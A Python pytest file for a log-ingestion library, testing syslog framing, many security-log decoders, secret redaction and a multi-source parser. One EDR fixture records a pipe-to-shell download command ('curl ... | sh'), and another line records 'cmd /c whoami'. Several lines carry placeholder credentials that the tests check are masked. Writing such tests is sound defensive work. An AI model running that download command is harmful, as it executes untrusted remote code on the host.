"""Mixed and multi-source logs: framing, per-line decoders, redaction and the multilog parser."""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

import pytest

from raf.core.ingestion.base import ParseContext, RawRecord, SourceInfo
from raf.core.ingestion.logs.dispatch import decode_line, finish
from raf.core.ingestion.logs.frame import frame_line
from raf.core.ingestion.logs.values import Fields, kv_pairs, parse_cef, parse_leef, safe_value, snake
from raf.core.ingestion.normalizers.native import NativeNormalizer
from raf.core.ingestion.parsers.multilog import MultiLogParser
from raf.core.ingestion.registry import ParserRegistry
from raf.core.netaddr import ip_scope
from raf.core.timeutil import UTC
from tests.conftest import FIXTURES


def _ctx() -> ParseContext:
    return ParseContext(
        source=SourceInfo(name="mixed.log"),
        default_tz=UTC,
        reference_time=None,
        max_record_bytes=1 << 20,
        raw_max_bytes=2048,
        store_raw=True,
    )


def _decode(line: str) -> tuple[str, dict[str, Any]]:
    frame = frame_line(line)
    decoded = decode_line(frame)
    return decoded.family, finish(decoded, frame)


def _normalize(line: str) -> Any:
    family, data = _decode(line)
    out = NativeNormalizer().normalize(RawRecord(data, "line 1", line), _ctx())
    return family, out


class TestFraming:
    @pytest.mark.parametrize(
        "line,framing,tag,host,pid,level",
        [
            ("2026-10-07T19:00:00.059Z nginx[edge-01] 10.0.0.1 - - x", "tagged", "nginx", "edge-01", None, None),
            ('2026-10-07T19:00:00Z cloudtrail {"a": 1}', "tagged", "cloudtrail", None, None, None),
            ("2026-10-07T19:00:00Z web-01 sshd[123]: Accepted x", "iso-syslog", "sshd", "web-01", "123", None),
            ("<34>Oct  7 19:00:00 web-01 sshd[9]: Failed password", "rfc3164", "sshd", "web-01", "9", "crit"),
            ('<165>1 2026-10-07T19:00:00Z host app 77 ID47 [ex@1 a="b"] hi', "rfc5424", "app", "host", "77", "notice"),
            ("2026-10-07 19:00:00,123 INFO [main] App - started", "timestamped", None, None, None, "info"),
            ("[2026-10-07 19:00:00] ERROR: boom", "timestamped", None, None, None, "error"),
            ("1696700000.123     45 10.0.0.1 TCP_MISS/200 1 GET http://x/ - DIRECT/1.2.3.4 -", "epoch", None, None,
             None, None),
            ('{"time": "2026-10-07T19:00:00Z"}', "bare", None, None, None, None),
        ],
    )  # fmt: skip
    def test_frames(
        self, line: str, framing: str, tag: str | None, host: str | None, pid: str | None, level: str | None
    ) -> None:
        frame = frame_line(line)
        assert (frame.framing, frame.tag, frame.host, frame.pid, frame.level) == (framing, tag, host, pid, level)

    def test_syslog_with_year_becomes_iso(self) -> None:
        frame = frame_line("Oct  7 19:00:00 2026 fw01 kernel: IN=eth0 OUT= SRC=1.2.3.4")
        assert frame.timestamp == "2026-10-07T19:00:00" and frame.tag == "kernel"

    def test_structured_data(self) -> None:
        frame = frame_line('<165>1 2026-10-07T19:00:00Z h a - - [origin ip="10.0.0.9" x="a\\"b"] msg')
        assert frame.structured == {"origin": {"ip": "10.0.0.9", "x": 'a"b'}}


class TestValues:
    def test_kv_and_snake(self) -> None:
        assert kv_pairs("user=alice msg=\"hello world\" n=3, empty= k='v w'") == {
            "user": "alice",
            "msg": "hello world",
            "n": "3",
            "empty": "",
            "k": "v w",
        }
        assert snake("sourceIPAddress") == "source_ip_address" and snake("requestID") == "request_id"
        fields = Fields({"userIdentity": {"userName": "x"}, "clientIp": "10.0.0.1"})
        assert fields.text("userIdentity.userName") == "x" and fields.text("client_ip") == "10.0.0.1"

    def test_cef_and_leef(self) -> None:
        cef = parse_cef(r"<13>Oct 7 host CEF:0|V|P|1|42|Pipe \| name|7|src=1.2.3.4 msg=has spaces act=blocked")
        assert cef is not None and cef["name"] == "Pipe | name" and cef["extension"]["msg"] == "has spaces"
        leef = parse_leef("LEEF:2.0|V|P|1|E7|^|src=1.2.3.4^usrName=bob")
        assert leef is not None and leef["fields"] == {"src": "1.2.3.4", "usrName": "bob"}

    def test_secret_values_are_redacted(self) -> None:
        assert safe_value("password", "hunter2hunter2") != "hunter2hunter2"
        assert "s3cr3tT0kenValue" not in safe_value("message", "Authorization: Bearer s3cr3tT0kenValue123")
        assert safe_value("pwd", "/home/alice") == "/home/alice"  # sudo's PWD is a directory, not a password

    def test_ip_scope_treats_documentation_ranges_as_public(self) -> None:
        assert ip_scope("10.24.6.18") == "internal" and ip_scope("198.51.100.44") == "public"
        assert ip_scope("192.0.2.95") == "public" and ip_scope("::1") == "loopback" and ip_scope("host") is None


#: One line per decoder: (line, family, event type, checks on the native record).
LINES: list[tuple[str, str, str, dict[str, Any]]] = [
    (
        '2026-10-07T19:00:00.059Z nginx[edge-01] 10.24.11.25 - mert.yilmaz "GET /api/v1/me?token=abc123secret '
        'HTTP/1.1" 401 213 "-" "Mozilla/5.0" rt=0.072 rid=req-be58154346 upstream=customer-portal',
        "web-access",
        "http.request",
        {"attributes.status": 401, "attributes.request_id": "req-be58154346", "attributes.service": "customer-portal",
         "host": "edge-01", "outcome": "failure"},
    ),
    (
        '2026-10-07T19:00:00Z cloudtrail {"eventTime":"2026-10-07T19:00:00Z","eventSource":"s3.amazonaws.com",'
        '"eventName":"GetObject","sourceIPAddress":"198.51.100.44","userIdentity":{"type":"IAMUser","userName":'
        '"svc-a","accessKeyId":"AKIAIOSFODNN7EXAMPLE"},"requestParameters":{"bucketName":"b1","key":"k/x.gz"},'
        '"requestID":"r1"}',
        "cloudtrail",
        "cloud.api",
        {"attributes.access_key": "AKIA****MPLE", "attributes.bucket": "b1", "attributes.request_id": "r1"},
    ),
    (
        '2026-10-07T19:00:00Z k8s-audit {"kind":"Event","verb":"delete","user":{"username":'
        '"system:serviceaccount:ops:bot"},"sourceIPs":["10.0.0.7"],"objectRef":{"resource":"pods","namespace":'
        '"prod","name":"p-1"},"responseStatus":{"code":200},"auditID":"a1"}',
        "k8s-audit",
        "cloud.api",
        {"action": "delete", "attributes.k8s_resource": "pods", "attributes.src_ip": "10.0.0.7"},
    ),
    (
        "2026-10-07T19:00:00Z bind9[dns-01] client 10.24.8.31# 44920: query: s3.amazonaws.com IN A +E(0)K "
        "(10.24.0.53); response: NOERROR ttl=60",
        "dns-bind",
        "dns.query",
        {
            "attributes.query": "s3.amazonaws.com",
            "attributes.rcode": "NOERROR",
            "attributes.src_port": 44920,
            "attributes.dst_ip": "10.24.0.53",
        },
    ),
    (
        "2026-10-07T19:00:00Z postgres[db-1] user=report_ro db=ops app=w client=10.24.8.31 LOG: duration: 67.8 ms "
        "statement: ALTER USER x PASSWORD 'hunter2'",
        "postgres",
        "db.query",
        {"attributes.sql_verb": "ALTER", "attributes.sql_risk": ["privilege-change"], "severity": "medium"},
    ),
    (
        '2026-10-07T19:00:00Z idp {"eventType":"user.authentication","actor":"eda@corp.example","outcome":"FAILURE",'
        '"clientIp":"10.24.8.32","app":"corp-sso","deviceId":"dev-1","sessionId":"sid-1"}',
        "identity",
        "auth.failure",
        {"actor": "eda@corp.example", "attributes.device_id": "dev-1", "outcome": "failure"},
    ),
    (
        '2026-10-07T19:00:00Z edr {"event":"ProcessStart","hostname":"db-1","user":"root","image":"/usr/bin/bash",'
        '"commandLine":"bash -c \'curl http://x | sh\'","processId":7,"parentProcessId":1,"action":"allow"}',
        "edr",
        "process.start",
        {"host": "db-1", "attributes.pid": "7", "attributes.parent_pid": "1"},
    ),
    (
        '2026-10-07T19:00:00Z netflow {"src":"10.0.0.1","dst":"192.0.2.50","dport":443,"protocol":"tcp",'
        '"bytesOut":5,"bytesIn":7,"decision":"allow"}',
        "flow",
        "network.flow",
        {"attributes.bytes": 12, "attributes.dst_port": 443, "outcome": "success"},
    ),
    (
        '2026-10-07T19:00:00Z app {"level":"INFO","service":"gw","event":"artifact.download","actor":"guest",'
        '"path":"a/b.zip","bytes":17,"cache":"public-link","request_id":"r9"}',
        "app",
        "file.read",
        {"attributes.cache": "public-link", "attributes.request_id": "r9"},
    ),
    (
        '2026-10-07T19:00:00Z change {"ticket":"CHG-1","service":"svc","actor":"bot","action":"restart",'
        '"status":"approved","window":"19:30-20:00Z"}',
        "change",
        "change.record",
        {"attributes.window_start": "2026-10-07T19:30:00Z", "attributes.window_end": "2026-10-07T20:00:00Z"},
    ),
    (
        "2026-10-07T19:00:00Z s3-access bucket=b1 requester=svc-a key=k/x.gz op=REST.GET.OBJECT status=200 "
        "remote_ip=198.51.100.44 request_id=r1 bytes_sent=900",
        "s3-access",
        "file.read",
        {"attributes.bytes_sent": 900, "attributes.request_id": "r1"},
    ),
    (
        "Oct  7 19:00:00 web-01 sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4 ssh2",
        "syslog",
        "auth.failure",
        {"attributes.src_ip": "203.0.113.9", "attributes.invalid_user": True},
    ),
    (
        "2026-10-07T19:00:00Z waf CEF:0|V|WAF|1|942100|SQL injection blocked|5|src=203.0.113.90 dst=10.0.0.10 "
        "act=blocked cat=attack",
        "cef",
        "alert",
        {"severity": "medium", "attributes.src_ip": "203.0.113.90"},
    ),
    (
        "2026-10-07T19:00:00Z winlog <Event><System><Provider Name='Microsoft-Windows-Security-Auditing'/>"
        "<EventID>4625</EventID><TimeCreated SystemTime='2026-10-07T19:00:00Z'/><Computer>dc-1</Computer></System>"
        "<EventData><Data Name='TargetUserName'>bob</Data><Data Name='IpAddress'>203.0.113.5</Data>"
        "<Data Name='LogonType'>3</Data></EventData></Event>",
        "windows-xml",
        "auth.failure",
        {"actor": "bob", "attributes.event_code": 4625, "attributes.logon_type": "network"},
    ),
    (
        '{"EventID": 1, "ProviderName": "Microsoft-Windows-Sysmon", "Computer": "ws-1", "UtcTime": '
        '"2026-10-07 19:00:00.000", "EventData": {"Image": "C:\\\\w\\\\cmd.exe", "CommandLine": "cmd /c whoami", '
        '"ProcessId": "42", "User": "CORP\\\\alice", "ParentImage": "C:\\\\w\\\\explorer.exe"}}',
        "windows",
        "process.start",
        {"host": "ws-1", "attributes.pid": "42"},
    ),
    (
        '{"timestamp":"2026-10-07T19:00:00.1+0000","event_type":"alert","src_ip":"203.0.113.4","src_port":4,'
        '"dest_ip":"10.0.0.2","dest_port":80,"proto":"TCP","alert":{"signature":"ET SCAN x","severity":1}}',
        "suricata",
        "alert",
        {"severity": "high", "message": "ET SCAN x"},
    ),
    (
        '{"ts":1791313200.5,"uid":"C1","id.orig_h":"10.0.0.1","id.orig_p":5,"id.resp_h":"10.0.0.2","id.resp_p":53,'
        '"proto":"udp","query":"example.com","rcode_name":"NOERROR","answers":["192.0.2.1"]}',
        "zeek",
        "dns.query",
        {"attributes.query": "example.com", "attributes.answers": ["192.0.2.1"]},
    ),
    (
        '{"published":"2026-10-07T19:00:00Z","eventType":"user.session.start","actor":{"alternateId":'
        '"bob@corp.example"},"client":{"ipAddress":"203.0.113.7"},"outcome":{"result":"FAILURE"}}',
        "okta",
        "auth.failure",
        {"attributes.src_ip": "203.0.113.7"},
    ),
    (
        '{"createdDateTime":"2026-10-07T19:00:00Z","userPrincipalName":"al@corp.example","ipAddress":"203.0.113.8",'
        '"appDisplayName":"Portal","status":{"errorCode":50126}}',
        "azure-signin",
        "auth.failure",
        {"attributes.error_code": 50126},
    ),
    (
        '{"timestamp":"2026-10-07T19:00:00Z","protoPayload":{"methodName":"SetIamPolicy","serviceName":'
        '"cloudresourcemanager.googleapis.com","resourceName":"projects/p","authenticationInfo":{"principalEmail":'
        '"a@p.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"203.0.113.3"},"status":{}}}',
        "gcp-audit",
        "cloud.api",
        {"action": "SetIamPolicy", "attributes.src_ip": "203.0.113.3"},
    ),
    (
        "2026-10-07T19:00:00Z audit type=USER_LOGIN msg=audit(1791313200.000:41): pid=1 uid=0 auid=1003 "
        "msg='op=login acct=\"ops\" exe=\"/usr/sbin/sshd\" addr=10.0.0.5 terminal=ssh res=failed'",
        "auditd",
        "auth.failure",
        {"attributes.src_ip": "10.0.0.5"},
    ),
    (
        "2026-10-07T19:00:00Z asa01 %ASA-4-106023: Deny tcp src outside:203.0.113.4/5555 dst inside:10.0.0.9/22 by "
        'access-group "OUT" [0x0, 0x0]',
        "cisco-asa",
        "network.connection",
        {"attributes.blocked": True, "attributes.dst_port": 22},
    ),
    (
        "1791313200.123     45 10.0.0.1 TCP_MISS/200 1234 GET http://example.com/x - DIRECT/192.0.2.1 text/html",
        "squid",
        "http.request",
        {"attributes.cache_result": "TCP_MISS", "attributes.dst_ip": "192.0.2.1"},
    ),
    (
        "2 123456789012 eni-0a1b 10.0.0.5 203.0.113.9 443 51515 6 10 8400 1791313200 1791313260 REJECT OK",
        "vpc-flow",
        "network.flow",
        {"attributes.protocol": "tcp", "attributes.blocked": True, "outcome": "failure"},
    ),
    (
        "2026/10/07 19:00:00 [error] 12#0: *5 open() \"/var/www/x\" failed (2: No such file or directory), "
        'client: 203.0.113.4, server: shop, request: "GET /x HTTP/1.1", host: "shop.example"',
        "web-error",
        "http.request",
        {"attributes.src_ip": "203.0.113.4", "attributes.path": "/x"},
    ),
    (
        '{"log":"2026-10-07T19:00:00Z ERROR payment failed for user=carol from 10.0.0.3\\n","stream":"stderr",'
        '"time":"2026-10-07T19:00:00.5Z"}',
        "text",
        "log.message",
        {"attributes.stream": "stderr", "attributes.src_ip": "10.0.0.3"},
    ),
    (
        "2026-10-07T19:00:00Z some-daemon: Failed login for user frank from 203.0.113.12",
        "text",
        "auth.failure",
        {"actor": "frank", "attributes.src_ip": "203.0.113.12"},
    ),
]  # fmt: skip


def _get(data: dict[str, Any], dotted: str) -> Any:
    current: Any = data
    for part in dotted.split("."):
        current = current.get(part) if isinstance(current, dict) else None
    return current


@pytest.mark.parametrize("line,family,event_type,checks", LINES, ids=[f"{i}-{x[1]}" for i, x in enumerate(LINES)])
def test_decoders(line: str, family: str, event_type: str, checks: dict[str, Any]) -> None:
    got_family, data = _decode(line)
    assert (got_family, data["event_type"]) == (family, event_type), data
    assert data.get("timestamp"), data
    for path, expected in checks.items():
        assert _get(data, path) == expected, (path, data)
    # every decoded line normalizes into an event
    NativeNormalizer().normalize(RawRecord(data, "line 1", line), _ctx())


def test_credentials_never_appear_in_clear() -> None:
    family, out = _normalize(LINES[1][0])
    stored = json.dumps([o.metadata for o in out.objects] + [o.name for o in out.objects] + [out.events[0].attributes])
    assert family == "cloudtrail" and "AKIAIOSFODNN7EXAMPLE" not in stored
    secret = next(o for o in out.objects if o.type == "secret")
    assert secret.name == "AKIA****MPLE" and secret.metadata["fingerprint"].startswith("sha256:")
    roles = {(r.role, r.object_id.split(":", 1)[0]) for r in out.events[0].objects}
    assert ("credential", "secret") in roles and ("object", "file") in roles
    _family, web = _normalize(LINES[0][0])
    assert "abc123secret" not in json.dumps(web.events[0].attributes)
    _family, sql = _normalize(LINES[4][0])
    assert "hunter2" not in json.dumps(sql.events[0].attributes)


def test_dns_server_address_belongs_to_the_logging_server() -> None:
    family, out = _normalize(LINES[3][0])
    assert family == "dns-bind"
    roles = {(r.role, r.object_id) for r in out.events[0].objects}
    assert ("dst_ip", "ip:10.24.0.53") in roles and ("src_ip", "ip:10.24.8.31") in roles
    links = {(r.source_id, r.type, r.target_id) for r in out.relationships}
    assert ("host:dns-01", "HAS_ADDRESS", "ip:10.24.0.53") in links


def test_identity_lines_create_sessions_and_strip_domains() -> None:
    _family, out = _normalize(LINES[5][0])
    ev = out.events[0]
    assert ev.actor == "user:eda" and ev.target == "service:corp-sso"
    assert any(r.role == "session" and r.object_id == "session:corp-sso|sid-1" for r in ev.objects)


class TestParser:
    def _records(self, text: str) -> list[RawRecord]:
        import io

        return list(MultiLogParser().records(io.BytesIO(text.encode()), _ctx()))

    def test_detection(self, tmp_path: Path) -> None:
        mixed = FIXTURES / "logs" / "raven-multisource.log"
        detected = ParserRegistry.default().detect(mixed, mixed.read_bytes()[:65536])
        assert detected is not None and detected[0].name == "multilog" and detected[1] >= 0.95
        assert "source(s)" in MultiLogParser.describe(mixed.read_bytes()[:65536])
        auth = FIXTURES / "evidence" / "auth.log"  # plain syslog stays with the syslog parser
        assert ParserRegistry.default().detect(auth, auth.read_bytes())[0].name == "syslog"  # type: ignore[index]
        single = tmp_path / "dns.log"
        single.write_text(
            "".join(
                f"2026-10-07T19:00:0{i}Z named[1]: client 10.0.0.{i}#5353: query: a.example IN A + (10.0.0.53)\n"
                for i in range(5)
            )
        )
        assert ParserRegistry.default().detect(single, single.read_bytes())[0].name == "multilog"  # type: ignore[index]

    def test_continuations_headers_and_rejections(self) -> None:
        text = (
            "orphan line without a timestamp\n"
            "2026-10-07 19:00:00,001 ERROR [main] App - request failed\n"
            "java.lang.IllegalStateException: boom\n"
            "    at com.example.App.run(App.java:42)\n"
            "#Fields: date time c-ip cs-method cs-uri-stem sc-status cs(User-Agent)\n"
            "2026-10-07 19:00:01 203.0.113.5 GET /admin 403 Mozilla/5.0+(X11)\n"
            "#separator \\x09\n"
        )
        records = self._records(text)
        assert records[0].error is not None and "No timestamp" in records[0].error.message
        assert records[1].locator == "lines 2-4" and "IllegalStateException" in records[1].data["message"]
        assert records[1].data["attributes"]["continuation_lines"] == 2
        iis = records[2].data
        assert iis["event_type"] == "http.request" and iis["attributes"]["status"] == 403
        assert iis["attributes"]["user_agent"] == "Mozilla/5.0 (X11)" and records[2].parser_label == "multilog-http/1.0"

    def test_zeek_tsv(self) -> None:
        text = (
            "#separator \\x09\n"
            "#fields\tts\tuid\tid.orig_h\tid.orig_p\tid.resp_h\tid.resp_p\tproto\tservice\torig_bytes\tresp_bytes\n"
            "1791313200.000000\tC1\t10.0.0.1\t5000\t192.0.2.9\t443\ttcp\tssl\t100\t-\n"
        )
        record = self._records(text)[0]
        assert record.data["event_type"] == "network.flow" and record.data["attributes"]["bytes_out"] == 100

    def test_sources_are_counted(self) -> None:
        text = (FIXTURES / "logs" / "raven-multisource.log").read_text().splitlines()[:300]
        origins = {r.origin for r in self._records("\n".join(text) + "\n")}
        assert {"nginx", "cloudtrail", "app", "bind9", "idp"} <= origins
